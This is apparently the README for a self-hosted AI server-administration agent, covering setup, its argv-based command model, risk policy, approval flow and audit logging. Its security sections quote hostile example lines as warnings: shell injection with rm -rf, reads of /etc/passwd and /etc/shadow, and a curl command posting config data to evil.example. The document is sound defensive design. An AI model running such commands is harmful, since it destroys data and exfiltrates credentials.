# AI Server Administration Agent

A self-hosted AI agent for Ubuntu server administration. The LLM reasons about problems; the agent executes **structured argv-based commands** under the Linux permissions of a dedicated `ai` user, with **policy enforcement**, **human approval**, and **audit logging**.

This project is designed so the LLM is **never given unrestricted shell access**.

## Quick start

```bash
python3 -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -e ".[dev]"

cp .env.example .env
# Pick a setup path below and edit the listed variables

ai-agent
```

**Requirements:**
- Python 3.11+
- an LLM backend (see [Setup guide](#setup-guide))
- a Linux target user `ai` **without sudo** for command execution.

For the recommended first run on Windows or macOS, use [Path A — Ollama on this machine](#path-a-ollama-on-this-machine-recommended). For split model/agent processes, see [Path B — Two-window workflow](#path-b-two-window-workflow-same-machine).

---

## Setup guide

Copy [`.env.example`](.env.example) to `.env`, pick **one path**, and set only the variables listed for that path. The full variable reference is in [Configuration](#configuration).

### Prerequisites (every path)

| Requirement | Notes |
|-------------|--------|
| Python 3.11+ | Project runtime |
| `pip install -e ".[dev]"` | Installs **ai-agent only** — not Ollama or vLLM |
| `.env` file | Start from `.env.example` |

**Engine installs are separate:**

| Engine | Install | Typical platform |
|--------|---------|------------------|
| **Ollama** | [ollama.com](https://ollama.com/) | Windows, macOS, Linux — **recommended for local dev** |
| **vLLM** | `pip install vllm` (Linux + NVIDIA CUDA) | Officially **Linux/WSL2**, not native Windows |

When `LLM_MANAGE_UPSTREAM=true` (default), `ai-agent-llm` runs `ollama serve` or `vllm serve` for you. The engine binary or Python package must still be installed on the machine where `ai-agent-llm` runs.

---

### Path A — Ollama on this machine (recommended)

**When:** Local development on Windows, macOS, or Linux. Simplest way to get running.

**1. Install Ollama** from [ollama.com](https://ollama.com/) and pull a model:

```bash
ollama pull qwen3:14b
```

**2. Set these in `.env`:**

| Variable | Example | Purpose |
|----------|---------|---------|
| `LLM_ENGINE` | `ollama` | Server-side engine (for `ai-agent-llm`) |
| `LLM_MODEL` | `qwen3:14b` | Must match a model Ollama has pulled |
| `LLM_UPSTREAM` | `http://localhost:11434` | Where Ollama listens |
| `LLM_HOST` | `http://localhost:11434` | Where **ai-agent** connects (see Path B for facade URL) |
| `LLM_MANAGE_UPSTREAM` | `true` | `ai-agent-llm` starts `ollama serve` if needed |

Optional: `OLLAMA_NUM_CTX=16384` (context window, Ollama only).

**3. Run (single process — agent only):**

If Ollama is already running (Ollama app or `ollama serve`):

```bash
ai-agent
```

**Or run the full stack** with [Path B](#path-b-two-window-workflow-same-machine) so `ai-agent-llm` manages Ollama and exposes a stable facade URL.

---

### Path B — Two-window workflow (same machine)

**When:** You want a dedicated model server process (`ai-agent-llm`) and a separate agent CLI, or you want warmup + a stable local URL to paste into `.env`.

**1. Set these in `.env` (before starting):**

| Variable | Example | Purpose |
|----------|---------|---------|
| `LLM_ENGINE` | `ollama` or `vllm` | Engine `ai-agent-llm` uses |
| `LLM_MODEL` | `qwen3:14b` | Model name/id for that engine |
| `LLM_UPSTREAM` | `http://localhost:11434` | Engine bind URL (**not** the facade URL) |
| `LLM_MANAGE_UPSTREAM` | `true` | Start/stop engine with `ai-agent-llm` |
| `LLM_BIND_HOST` | `127.0.0.1` | Facade listen address |
| `LLM_BIND_PORT` | `0` | `0` = OS picks a free port |

Do **not** set `LLM_HOST` yet — Window 1 prints it.

**2. Window 1 — model server:**

```bash
ai-agent-llm
```

Wait for `Endpoint: http://127.0.0.1:…` and copy the printed `LLM_HOST=…` line into `.env`.

**3. Window 2 — agent:**

```bash
ai-agent
```

The agent reads `LLM_HOST` (facade URL). `LLM_UPSTREAM` stays pointed at the real engine so restarts do not loop the facade onto itself.

Details: [Two-window workflow](#two-window-workflow-details) · Architecture: [`ai_agent/llm/ARCHITECTURE.md`](ai_agent/llm/ARCHITECTURE.md)

---

### Path C — Remote Ollama over SSH

**When:** Ollama runs on a GPU box; the agent runs on your laptop. Ollama stays on `127.0.0.1:11434` on the remote machine — no LAN exposure.

**1. On the GPU machine:** install Ollama and this repo; run host setup when the wizard tells you to.

**2. On the agent machine:** run the wizard (writes `.env` for you):

```bash
ai-agent config remote-provider
ai-agent config remote-provider test
```

**Variables the wizard sets (or set manually):**

| Variable | Purpose |
|----------|---------|
| `LLM_TRANSPORT` | `ssh` |
| `LLM_ENGINE` | `ollama` (SSH path is Ollama-only today) |
| `LLM_SSH_HOST` | Host alias in `.ai-agent/ssh/config` |
| `LLM_SSH_CONFIG` | Path to sandbox SSH config |
| `LLM_SSH_REMOTE` | Ollama on GPU box (default `127.0.0.1:11434`) |
| `LLM_HOST` | Local tunnel URL (wizard default `http://127.0.0.1:11434`) |
| `LLM_MODEL` | Model pulled on the GPU box |
| `LLM_MANAGE_UPSTREAM` | `false` — engine runs on remote host, not started locally |

**3. Start the agent:**

```bash
ai-agent
```

Full walkthrough: [SSH remote provider](#ssh-remote-provider).

---

### Path D — vLLM (Linux / WSL2)

**When:** You need vLLM for fine-tuning throughput or specific Hugging Face models.

**Platform notes:**

- **Linux + NVIDIA GPU:** supported — `pip install vllm`
- **Windows (native):** vLLM is **not** officially supported; use [Path A (Ollama)](#path-a-ollama-on-this-machine-recommended), [WSL2](https://docs.vllm.ai/en/latest/getting_started/installation/gpu/), or set `LLM_MANAGE_UPSTREAM=false` and point at a remote vLLM server
- **`pip install -e ".[dev]"` does not install vLLM** — install it separately in the same venv or WSL environment

**Set these in `.env`:**

| Variable | Example | Purpose |
|----------|---------|---------|
| `LLM_ENGINE` | `vllm` | Use vLLM engine |
| `LLM_MODEL` | `meta-llama/Llama-3.1-8B-Instruct` | Model id vLLM serves |
| `LLM_UPSTREAM` | `http://localhost:8000` | vLLM bind URL (default port 8000) |
| `LLM_MANAGE_UPSTREAM` | `true` | `ai-agent-llm` runs `vllm serve …` |
| `LLM_STARTUP_TIMEOUT` | `180` | Model load can take minutes |
| `VLLM_MAX_TOKENS` | optional | Cap reply length |

Optional: `LLM_VLLM_BINARY=/path/to/vllm` if the CLI is not on `PATH`.

Then use [Path B](#path-b-two-window-workflow-same-machine) (`ai-agent-llm` + `ai-agent`).

If vLLM is already running elsewhere:

```env
LLM_MANAGE_UPSTREAM=false
LLM_UPSTREAM=http://your-vllm-host:8000
```

---

### Path E — Attach to an already-running engine

**When:** You start Ollama or vLLM yourself (systemd, Docker, cloud VM) and only want the facade + agent.

| Variable | Value |
|----------|--------|
| `LLM_MANAGE_UPSTREAM` | `false` |
| `LLM_UPSTREAM` | URL where the engine already listens |
| `LLM_ENGINE` | `ollama` or `vllm` — must match what's running |
| `LLM_MODEL` | Model available on that engine |

Run `ai-agent-llm` (facade + warmup) or point `LLM_HOST` directly at the engine if you skip the facade.

---

## Architecture

```text
User (CLI)
    |
    v
Agent Loop  ---- HTTP ---->  LLM host (Ollama, local or remote)
    |
    +--> Policy Engine (validate CommandExpr)
    |
    +--> Approval UX (confirm / batch preview / session grants)
    |
    +--> Execution targets (local / SSH / Docker; independent of the LLM host)
    |
    +--> Audit Logger
    |
    v
Linux (permissions of `ai` user)
```

The agent and the model do not have to share a machine. Set `LLM_HOST` to the LLM facade URL (or a direct server). Command execution uses named **execution targets** (this machine, SSH hosts, or Docker containers) and is not tied to that URL.

### Responsibilities stay separate

| Layer | Role |
|-------|------|
| LLM | Reasoning and proposing structured commands. Talked to only through `LLMProvider`. |
| Agent | Policy, approval, execution, logging |
| Linux | Final permission boundary |
| Human | Approves consequential operations |

**The model must not approve its own actions.** Approval tokens are created by the CLI, not inferred from chat text.

---

## Command model: argv + structured chaining

The LLM proposes **CommandExpr** JSON, not shell strings.

Supported expression types:

| Type | Meaning | Example rendered form |
|------|---------|------------------------|
| `single` | One argv array | `df -h` |
| `pipe` | Left expression piped to right argv | `journalctl ... \| grep error` |
| `and` | Run right only if left exits 0 | `systemctl is-active nginx && systemctl restart nginx` |
| `or` | Run right only if left exits non-zero | `test -f /tmp/x \|\| echo missing` |
| `redirect` | Limited stdout/stderr redirect | `df -h > /tmp/ai-agent/out.txt` |

Every leaf command is an **argv array**:

```json
{"type": "single", "argv": ["docker", "ps"]}
```

Pipelines:

```json
{
  "type": "pipe",
  "left": {
    "type": "single",
    "argv": ["journalctl", "-u", "nginx", "-n", "100", "--no-pager"]
  },
  "right": ["grep", "-i", "error"]
}
```

### Why not raw shell strings?

**Do not pass model output to `/bin/sh -c`.** Allow-lists on shell strings are bypassable:

```bash
cat /etc/passwd; rm -rf /important
cat file$(curl attacker)
cat /safe/path | sh
grep pattern /etc/shadow
```

Even when the user approves what they see, metacharacters and chained semantics hide intent.

Instead:

1. The model emits structured JSON (`CommandExpr`)
2. The policy engine validates **each segment**
3. The executor runs argv arrays directly (`subprocess` with list args — **no shell**)
4. The CLI renders a human-readable command for approval

This gives a shell-like UX without shell parsing.

---

## Security model

### Risk levels

| Level | Behavior |
|-------|----------|
| `READ_ONLY` | May auto-run in balanced mode (`df`, `docker ps`, `journalctl`, etc.) |
| `REVERSIBLE` | Requires confirmation (`systemctl restart`, `docker restart`) |
| `DESTRUCTIVE` | Requires explicit confirmation (`docker rm`, `systemctl disable`) |
| `FORBIDDEN` | Hard reject — never executed (`docker run`, `rm -rf /`, shell binaries) |

Effective risk for chained expressions is the **maximum** risk of all segments.

Policy is enforced in **`ai_agent/policy/default_policy.yaml`**. The LLM cannot override it.

### Linux user boundary

Run the agent as user `ai`:

- No sudo
- No automatic sudoers modification
- If a command fails with `Permission denied`, the agent reports that honestly

**Important:** Adding `ai` to the `docker` group grants significant privilege (Docker socket ≈ root). Document and accept this consciously on home servers.

### Filesystem policy

Path arguments (`cat`, `grep`, `ls`, etc.) must fall under configured readable roots (see policy YAML).

Redirects (`>`, `>>`, `2>`) are only allowed into configured writable directories (default: `/tmp/ai-agent`).

Always canonicalize paths and reject traversal outside allowed roots.

### Network tools (localhost health checks only)

Network commands are a **separate trust boundary** from filesystem read access.

Even read-only disk access does not prevent exfiltration:

```bash
cat /home/user/.config/app/config | curl -X POST -d @- https://evil.example/leak
```

v1 policy for `curl` / `wget`:

- **Allowed:** `GET` / `HEAD` to `127.0.0.1`, `localhost`, `::1`
- **Forbidden:** upload flags (`-d`, `--data`, `-T`, …)
- **Forbidden:** piping stdin into `curl` / `wget`
- **Forbidden:** arbitrary remote hosts

This supports local health checks (`curl http://127.0.0.1:8080/health`) without opening general outbound network access.

### Environment hardening

The executor passes a **minimal environment** (`PATH`, `LANG`, `HOME`, etc.) to subprocesses to reduce injection via `LD_PRELOAD` and similar variables.

---

## Confirmation UX

Three modes via `AGENT_CONFIRMATION_MODE`:

| Mode | Behavior |
|------|----------|
| `paranoid` | Confirm every command, including READ_ONLY |
| `balanced` | Auto-run READ_ONLY; confirm REVERSIBLE+ (**default**) |
| `permissive` | Auto-run up to REVERSIBLE; confirm DESTRUCTIVE+ |

### Single-command approval

For REVERSIBLE+ commands, the CLI shows:

```text
AI wants to execute:
  systemctl restart nginx
  Risk: REVERSIBLE
  Reason: nginx appears unhealthy
  Segments:
    1. systemctl restart nginx  [REVERSIBLE]

Approve? (y/n/a)
```

### Batch preview (READ_ONLY inspections)

When the model proposes multiple READ_ONLY checks, the CLI can show one prompt:

```text
AI wants to run these READ_ONLY checks:
  1. df -h  [READ_ONLY]
  2. docker ps  [READ_ONLY]
  3. journalctl -u nginx -n 100 --no-pager | grep -i error  [READ_ONLY]

Proceed with batch? (y/n/a)
```

This reduces prompt fatigue while keeping mutations gated.

### Session grants

Optional responses like `a` / `allow` create **session-scoped grants** (e.g. skip READ_ONLY prompts for the rest of the session). Grants are stored in the CLI session state — **not** in LLM context where the model could forge them.

---

## Audit logging

Every tool invocation logs structured JSON lines:

- timestamp, session ID, user
- tool name, arguments, rendered command
- risk level, confirmation required/granted
- exit status, duration, errors
- stdout/stderr preview (truncated)

Configure with `AGENT_AUDIT_LOG=/var/log/ai-agent/audit.jsonl`.

Secrets are redacted from keys matching `password`, `token`, `secret`, etc.

---

## Configuration

See [`.env.example`](.env.example). Scenario-specific checklists are in the [Setup guide](#setup-guide).

### LLM — agent client (`ai-agent`)

Set these when running the agent. For remote inference, see [Path C](#path-c-remote-ollama-over-ssh).

| Variable | Description |
|----------|-------------|
| `LLM_HOST` | URL the agent calls (facade from `ai-agent-llm`, direct Ollama/vLLM, or local end of SSH tunnel) |
| `LLM_MODEL` | Model name/id — must exist on the configured engine |
| `LLM_TRANSPORT` | `http` (default) or `ssh` (Ollama over SSH tunnel) |
| `LLM_SSH_HOST` | Host alias in `.ai-agent/ssh/config` (when `LLM_TRANSPORT=ssh`) |
| `LLM_SSH_CONFIG` | Path to sandbox SSH config (default `.ai-agent/ssh/config`) |
| `LLM_SSH_REMOTE` | Ollama bind on the GPU box (default `127.0.0.1:11434`) |
| `LLM_TIMEOUT` | HTTP read timeout for streaming generations (seconds) |

### LLM — model server (`ai-agent-llm`)

Set these when running `ai-agent-llm`. See [Path B](#path-b-two-window-workflow-same-machine) and [Path E](#path-e-attach-to-an-already-running-engine).

| Variable | Description |
|----------|-------------|
| `LLM_ENGINE` | Server-side engine: `ollama` or `vllm` |
| `LLM_UPSTREAM` | Engine bind URL (**not** the facade URL — do not point this at `LLM_HOST`) |
| `LLM_MANAGE_UPSTREAM` | When `true` (default), start/stop the engine process with the facade |
| `LLM_STARTUP_TIMEOUT` | Seconds to wait for the engine to accept HTTP (default `180`) |
| `LLM_BIND_HOST` | Address the facade listens on (default `127.0.0.1`) |
| `LLM_BIND_PORT` | Facade port (`0` = pick a free port and print it) |
| `LLM_OLLAMA_BINARY` | Optional path to `ollama` if not on `PATH` |
| `LLM_VLLM_BINARY` | Optional path to `vllm` if not on `PATH` |

### LLM — engine-specific options

| Variable | Engine | Description |
|----------|--------|-------------|
| `OLLAMA_NUM_CTX` | Ollama | Context window (default `16384`) |
| `OLLAMA_NUM_PREDICT` | Ollama | Optional reply token cap |
| `VLLM_MAX_TOKENS` | vLLM | Optional reply token cap |

### Agent behavior

| Variable | Description |
|----------|-------------|
| `AGENT_MAX_CONTINUATIONS` | How many times one answer may resume after being cut off |
| `AGENT_CONTINUATION_TAIL` | Characters of the partial answer resent when resuming |
| `AGENT_LOG_LEVEL` | Logging level |
| `AGENT_STREAM_RESPONSES` | Stream assistant text to the terminal as it is generated (`true` / `false`) |
| `AGENT_MAX_ITERATIONS` | Max tool-call loop iterations |
| `AGENT_TOOL_TIMEOUT` | Per-command timeout (seconds) |
| `AGENT_CONFIRMATION_MODE` | `paranoid` / `balanced` / `permissive` |
| `AGENT_OUTPUT_LIMIT` | Max stdout/stderr returned to model |
| `AGENT_AUDIT_LOG` | Audit log file path |
| `AGENT_POLICY_FILE` | Override policy YAML path |
| `AGENT_SCRATCH_DIR` | Writable scratch dir for redirects |

### Command execution (independent of LLM)

| Variable | Description |
|----------|-------------|
| `AGENT_EXECUTION_TARGETS_FILE` | YAML of named command-execution targets (default `execution_targets.yaml`) |
| `AGENT_DEFAULT_TARGET` | Target used when the model omits `target` (default `local`) |

### Full reference (all variables)

| Variable | Description |
|----------|-------------|
| `LLM_HOST` | URL the **agent** uses (facade, direct server, or local end of SSH tunnel) |
| `LLM_MODEL` | Model name/id for the configured `LLM_ENGINE` |
| `LLM_ENGINE` | Server-side engine for **`ai-agent-llm`**: `ollama` or `vllm` |
| `LLM_UPSTREAM` | Engine bind URL for **`ai-agent-llm`** (not the facade URL) |
| `LLM_MANAGE_UPSTREAM` | When `true` (default), **`ai-agent-llm`** starts/stops the engine process |
| `LLM_STARTUP_TIMEOUT` | Seconds to wait for the engine to accept HTTP (default `180`) |
| `LLM_TRANSPORT` | `http` (default) or `ssh` (Ollama engine only) |
| `LLM_SSH_HOST` | Host alias in the sandboxed SSH config |
| `LLM_SSH_CONFIG` | Path to `.ai-agent/ssh/config` |
| `LLM_SSH_REMOTE` | Engine bind on the GPU box (default `127.0.0.1:11434`) |
| `LLM_BIND_HOST` | Address the facade listens on (default `127.0.0.1`) |
| `LLM_BIND_PORT` | Facade port (`0` = pick a free port and print it) |
| `LLM_TIMEOUT` | HTTP read timeout for streaming generations (seconds) |
| `LLM_OLLAMA_BINARY` | Optional `ollama` binary path |
| `LLM_VLLM_BINARY` | Optional `vllm` binary path |
| `OLLAMA_NUM_CTX` | Context window (Ollama engine only) |
| `OLLAMA_NUM_PREDICT` | Optional reply token cap (Ollama engine only) |
| `VLLM_MAX_TOKENS` | Optional reply token cap (vLLM engine only) |
| `AGENT_MAX_CONTINUATIONS` | How many times one answer may resume after being cut off |
| `AGENT_CONTINUATION_TAIL` | Characters of the partial answer resent when resuming |
| `AGENT_LOG_LEVEL` | Logging level |
| `AGENT_STREAM_RESPONSES` | Stream assistant text to the terminal as it is generated (`true` / `false`) |
| `AGENT_MAX_ITERATIONS` | Max tool-call loop iterations |
| `AGENT_TOOL_TIMEOUT` | Per-command timeout (seconds) |
| `AGENT_CONFIRMATION_MODE` | `paranoid` / `balanced` / `permissive` |
| `AGENT_OUTPUT_LIMIT` | Max stdout/stderr returned to model |
| `AGENT_AUDIT_LOG` | Audit log file path |
| `AGENT_POLICY_FILE` | Override policy YAML path |
| `AGENT_SCRATCH_DIR` | Writable scratch dir for redirects |
| `AGENT_EXECUTION_TARGETS_FILE` | YAML of named command-execution targets (default `execution_targets.yaml`) |
| `AGENT_DEFAULT_TARGET` | Target used when the model omits `target` (default `local`) |

---

## LLM host (local or remote)

For **getting started**, use the [Setup guide](#setup-guide) paths instead of reading this section first.

Inference is split into **client** and **server** packages (see [`ai_agent/llm/ARCHITECTURE.md`](ai_agent/llm/ARCHITECTURE.md)):

| Package | Process | Role |
|---------|---------|------|
| `ai_agent.llm.client` | `ai-agent` | `FacadeLlmClient` — one provider, canonical HTTP API |
| `ai_agent.llm.server` | `ai-agent-llm` | `AgentLlmFacade` + `LlmEngine` (`OllamaEngine` or `VLLMEngine`) |
| `ai_agent.llm.http` | both | Shared HTTP transport only |

The agent never chooses Ollama vs vLLM. It connects to whatever URL is in `LLM_HOST` and displays `Engine: … | Model: …` from `/api/info`. Engine choice is server-side (`LLM_ENGINE` on `ai-agent-llm`).

| Piece | Role |
|-------|------|
| `LLMProvider` / `FacadeLlmClient` | Agent-side: `chat`, `chat_stream`, `healthcheck`, `close` |
| `AgentLlmFacade` | Stable `/api/chat`, `/api/tags`, `/api/info` HTTP surface |
| `OllamaEngine` / `VLLMEngine` | Server-side upstream adapters |
| SSH sandbox / tunnel | Optional: `ai-agent config remote-provider` (Ollama engine) |

**`LLM_HOST` vs `LLM_UPSTREAM`:** the agent only reads `LLM_HOST`. `LLM_UPSTREAM` is for `ai-agent-llm` — where the real engine listens. Never point `LLM_UPSTREAM` at the facade URL.

Command execution does not use `LLM_HOST`. See [Execution targets](#execution-targets).

### Upstream engines

By default (`LLM_MANAGE_UPSTREAM=true`), **`ai-agent-llm` starts and stops** the configured engine (`ollama serve` or `vllm serve …`) at `LLM_UPSTREAM`. Install Ollama or vLLM on the machine where `ai-agent-llm` runs — `pip install -e ".[dev]"` does not install them.

If the engine is already running at `LLM_UPSTREAM`, `ai-agent-llm` reuses it. Set `LLM_MANAGE_UPSTREAM=false` to attach without auto-start ([Path E](#path-e-attach-to-an-already-running-engine)).

### SSH remote provider

Prefer this over exposing Ollama on the LAN. Ollama stays on `127.0.0.1:11434` on the GPU PC. The agent opens a local port-forward with a **project-local** SSH config and keys (not `~/.ssh` at runtime).

```bat
ai-agent config remote-provider
```

The wizard prints GPU-box steps (Windows or Linux), can write `.env`, and never edits your user SSH config. To import an existing `Host` from `~/.ssh/config` it **copies** that host's key into `.ai-agent/ssh/` after a warning:

```bat
ai-agent config remote-provider --read-existing-ssh-hosts
```

Then:

```bat
ai-agent config remote-provider test
```

The first test asks you to trust the GPU PC's **sshd** host key and saves it in `.ai-agent/ssh/known_hosts` (not `~/.ssh`). That is required: the sandbox starts empty on purpose. You can also run `ai-agent config remote-provider trust-host` first.

```bat
ai-agent
```

`ai-agent config show` prints the current transport. `ai-agent config remote-provider disable` sets transport back to local HTTP.

On the GPU PC (same repo, Administrator PowerShell on Windows), install the printed key with:

```bat
ai-agent host-setup --public-key-file .ai-agent\ssh\host-setup.pub
```

That writes the correct authorized_keys file, restarts `sshd`, and checks Ollama on `127.0.0.1:11434`. Linux GPU hosts add `--linux`. Tailscale/WireGuard is optional: use that hostname as the SSH target.

### Two-window workflow (details)

Step-by-step checklist: [Path B — Two-window workflow](#path-b-two-window-workflow-same-machine).

Use this to run the model process and the agent as separate layers. With the default `LLM_MANAGE_UPSTREAM=true`, `ai-agent-llm` starts the engine for you. For vLLM, set `LLM_ENGINE=vllm` and `LLM_UPSTREAM=http://localhost:8000` before starting Window 1.

**Window 1 — model / facade**

```bat
ai-agent-llm
```

It healthchecks the upstream engine, warms the model with the same system prompt
and tools the agent uses, then listens on `127.0.0.1` (port `LLM_BIND_PORT`, or
an OS-chosen port if `0`). When ready it prints a URL, for example:

```text
Endpoint: http://127.0.0.1:52341

Copy this into .env, then start ai-agent in another terminal:
  LLM_HOST=http://127.0.0.1:52341
```

Leave that window open.

**Window 2 — agent**

Set `LLM_HOST` to the printed URL (`.env` or the environment), then:

```bat
ai-agent
```

The agent uses `FacadeLlmClient` against the local facade. The facade delegates to
the configured engine (`OllamaEngine` or `VLLMEngine`). Upstream URLs
`LLM_UPSTREAM` must not point at the facade URL.

This is a same-machine split for testing layers. There is no authentication on the facade; keep `LLM_BIND_HOST=127.0.0.1`.

### Connection errors

| When | What you see | What the CLI does |
|------|----------------|-------------------|
| Startup healthcheck fails (host down, refused, timeout, HTTP/protocol error) | `LLM endpoint unavailable: …` | Logs the error and **exits** (no REPL) |
| Startup: model name not present on that host | `ModelMissingError: the requested model '…' is not available with Ollama/vLLM …` | Logs the error and **exits** |
| Startup warmup fails after a passing healthcheck | `LLM warmup failed: …` | Logs the error and **exits** |
| Mid-chat: connect, timeout, HTTP, or bad JSON | Yellow `LLM error: …` (and any partial text) | Logs a warning and **stays in the REPL** so you can retry or quit |
| Mid-chat: SSH tunnel process died | Red message and `Exiting.` | Logs the error and **exits** |

The agent loop classifies failures with `LLMErrorKind` (`unavailable`, `timeout`, `http`, `protocol`, `model_not_found`, …), not vendor-specific strings.

---

## Streaming responses

When `AGENT_STREAM_RESPONSES=true` (the default), the CLI prints the model's answer as Ollama generates it, instead of waiting for the full reply.

### How it works

Final answers are written as **ordinary assistant text**. Ollama streams that content token-by-token over `/api/chat` with `stream: true`, and the CLI writes each chunk as it arrives.

Tool iterations (command execution, approvals, audit events) are not streamed. Only the user-facing answer text is.

Progress notes from the optional `respond` tool (`finished=false`) appear as dim status lines above the answer, not mixed into the streamed text.

### Limitations

**Tool-call arguments are not streamed incrementally.** Ollama typically delivers a complete tool call in one chunk when generation finishes, rather than streaming the JSON argument payload character by character.

That matters if a model puts its final answer inside `respond(message=...)` instead of writing plain assistant text. In that case the user still sees one flush at the end, not a live typewriter effect.

The system prompt steers models toward plain text for final answers, but smaller or less instruction-following models may ignore that and use `respond` anyway. If streaming feels like a blob, try a different model or check that the model is answering as prose rather than wrapping the reply in a tool call.

To disable streaming entirely, set `AGENT_STREAM_RESPONSES=false` in `.env`.

For a quick manual check against a live Ollama instance:

```bash
python scripts/stream_smoke_test.py "explain database migrations in three sentences"
```

The script prints chunk timing so you can confirm incremental output.

---

## Long answers and resuming

The agent finishes a turn when **it** decides it is done — by writing a complete plain-text answer, or by calling `respond(finished=true)`. Hitting a model or transport limit is not a decision, so those cases are resumed instead of ending the turn.

An answer is resumed when Ollama reports `done_reason: "length"`, or when the stream drops after partial output. Only the tail of the partial answer is resent, and text the model restates is trimmed so the output reads as one continuous answer. Trimming is deliberately conservative — it would rather leave a small seam at the join than delete content the model actually wrote.

To watch the resume path directly:

```bash
python scripts/resume_smoke_test.py
```

It reports chunk count, how many resumes happened, and the final length. Forcing `OLLAMA_NUM_PREDICT` low (for example `180`) makes resumes easy to observe.

### Why answers used to stop mid-sentence

Ollama's default context window is **4096 tokens**, shared between prompt and reply. A large system prompt plus a long answer exhausts it, which surfaces as `done_reason: "length"`. Resuming by appending the partial answer to the history made it worse — each attempt had less room than the last, until the model lost the beginning and started over.

Two things prevent that now:

- `OLLAMA_NUM_CTX` defaults to **16384** instead of Ollama's 4096
- Resume prompts are a fixed size: system prompt + request + last `AGENT_CONTINUATION_TAIL` characters

### Tuning

| Variable | Default | Effect |
|----------|---------|--------|
| `OLLAMA_NUM_CTX` | `16384` | Context window. Raise for longer answers, lower if VRAM is tight |
| `OLLAMA_NUM_PREDICT` | unset | Hard cap on reply tokens. Leave unset for uncapped replies |
| `AGENT_MAX_CONTINUATIONS` | `8` | How many times one answer may resume |
| `AGENT_CONTINUATION_TAIL` | `2000` | Characters of the partial answer resent when resuming |

If resumes are exhausted, the answer produced so far is kept and the CLI prints a note rather than truncating silently.

---

## Developer guide: avoiding security regressions

Read this before adding commands, tools, or policy rules.

### 1. Never add shell execution

```python
# FORBIDDEN
subprocess.run(command_string, shell=True)
subprocess.run(["/bin/sh", "-c", model_output])
```

```python
# CORRECT
subprocess.run(argv_list, shell=False)
```

### 2. Never trust model output

All tool arguments are **attacker-controlled input**. Validate structure (Pydantic) **and** semantics (policy engine).

### 3. Do not parse shell syntax from strings

If you need new chaining behavior, add a new **`CommandExpr` type** and validate it explicitly — do not regex-match user/model strings.

### 4. Expand allow-lists carefully

When adding policy rules, specify:

- binary name
- subcommand (if applicable)
- path argument requirements
- network restrictions (if applicable)
- risk level

Default for unmatched commands is **FORBIDDEN**.

### 5. Beware implicit privilege escalation

| Change | Risk |
|--------|------|
| Adding `ai` to `docker` group | Near-root access |
| Allowing `docker run` | Container escape / mount host FS |
| Allowing remote `curl` | Data exfiltration |
| Allowing `\| sh` or `xargs` | Full shell bypass |
| Broadening readable paths to `/` | Credential exposure |

### 6. Chain risk aggregation

When adding operators, compute effective risk as **max(segment risks)** and reject the whole expression if any segment is FORBIDDEN.

### 7. Do not let the model self-approve

Never encode approval as a tool result the model can write. Approval must come from the CLI input layer.

### 8. Test policy, not just happy paths

Add tests for:

- forbidden patterns
- path traversal
- network exfil attempts
- chained bypass attempts
- confirmation gates
- audit records on denial

Run tests:

```bash
pytest
```

---

## Project layout

```text
ai_agent/
  agent/          # Agent loop and tool schemas
  approval/       # Confirmation UX and session grants
  audit/          # Audit logging
  cli/            # Terminal (`ai-agent`, `config`, `host-setup`, `ai-agent-llm`)
  commands/       # CommandExpr AST, render, executor
  execution_targets/  # Named local / SSH / Docker backends and router
  llm/            # client/ (agent), server/ (ai-agent-llm), http/, SSH tunnel
  policy/         # Risk levels, policy engine, default_policy.yaml
tests/
```

---

## Execution targets

Approved commands run on a **named target** from configuration. The model picks a name such as `local` or `home-server`. It cannot supply a hostname, SSH key, or container ID.

| Type | Meaning |
|------|---------|
| `local` | This machine (always present). The usual default when the model omits `target`. |
| `ssh` | Remote host. One generated ed25519 key per target under `.ai-agent/execution-targets/<name>/`. |
| `docker` | `docker exec` into an existing container. Optional `user` (wizard default `root`) maps to `docker exec -u`, so you do not need sudo or a password inside the image. |

This is separate from where the LLM runs (`LLM_HOST` / `remote-provider`).

```bat
ai-agent config execution-target
ai-agent config execution-target list
ai-agent config execution-target trust home-server
```

The wizard can reuse **host / user / port** from `~/.ssh/config`, then generates a **new** key for the agent. Existing personal keys are not copied and are not used at runtime.

SSH public keys belong in the remote user's `authorized_keys`. Host keys are stored per target (not in `~/.ssh`).

## Roadmap (not yet implemented)

- Web UI with the same approval token model
- AppArmor / Landlock profiles
- OS-level network restrictions for `ai` user
- Persistent memory, scheduled tasks, notifications
- Additional LLM providers

---

## License

MIT
